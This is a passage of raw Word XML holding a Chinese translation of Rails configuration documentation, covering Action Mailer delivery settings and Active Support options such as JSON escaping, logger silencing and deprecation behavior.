          <w:numId w:val="20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:location</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – sendmail 执行文件的位置. 默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/usr/sbin/sendmail</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766D219C" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20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:arguments</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 命令行参数。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-i -t</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AF53E8" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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config.action_mailer.raise_delivery_errors</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设定当邮件发送失败时是否抛出异常。默认为 true.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0832DD67" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="208"/>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config.action_mailer.delivery_method</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定发送方法。可用的值为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:smtp</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (默认), </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:sendmail</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:test</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22645E09" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="209"/>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config.action_mailer.perform_deliveries</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设定邮件是否会被发送，默认为 true. 可以将其设置为 false 以方便测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7839C9" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="210"/>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config.action_mailer.default</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置 Action Mailer 的默认值。这些默认值为: </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblInd w:w="720" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7586"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="3745C509" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="424DCEE7"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:mime_version</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "1.0",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E074990"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:charset</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">      </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "UTF-8",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="389DE464"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:content_type</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "text/plain",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C4FAA52"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:parts_order</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; [ "text/plain", "text/enriched", "text/html"</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0AA4BB6C" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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config.action_mailer.observers</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 登记观察者，在邮件被发送时会作出提醒。 </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblInd w:w="720" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="3AF7378B" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6CB6C6D8" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1481731759"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.action_mailer.observers = ["MailObserver"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="391A98B4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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config.action_mailer.interceptors</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 登记拦截器，它会在邮件发送前被调用。 </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblInd w:w="720" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="3EE22BAC" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C60F6A0" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1736315551"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.action_mailer.interceptors = ["MailInterceptor"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05B22D45"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3.11 配置 Active Support</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7F63FE"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Active Support 有如下一些可用配置选项:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752BDC64" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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config.active_support.bare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是否让 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>active_support/all</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 Rails 启动时的加载。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 意思是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>active_support/all</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 已经加载了(所以Rails不会再加载)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB2CF5B" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="214"/>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config.active_support.escape_html_entities_in_json</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置在 JSON 序列化中是否剔除 HTML 实体。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC9A69C" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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config.active_support.use_standard_json_time_format</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是否使日期序列化成 ISO 8601 格式。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F096C42" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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ActiveSupport::BufferedLogger.silencer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 则禁止取消代码块里的日志记录。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278B2C05" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21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ActiveSupport::Cache::Store.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设定在缓存存储操作中的日志类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21248207" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="218"/>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ActiveSupport::Deprecation.behavior</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_support.deprecation</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可选的设置器，它能配置 Rails 废弃警告的动作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109D0197" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="219"/>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ActiveSupport::Deprecation.silence</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个代码块，这个代码块里的所有废弃警告都会被忽略。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7252B66C" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="220"/>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ActiveSupport::Deprecation.slienced</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置是否打印出废弃警告。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2D52C1" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="221"/>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ActiveSupport::Logger.silencer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 则禁止取消代码块里的日志记录。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
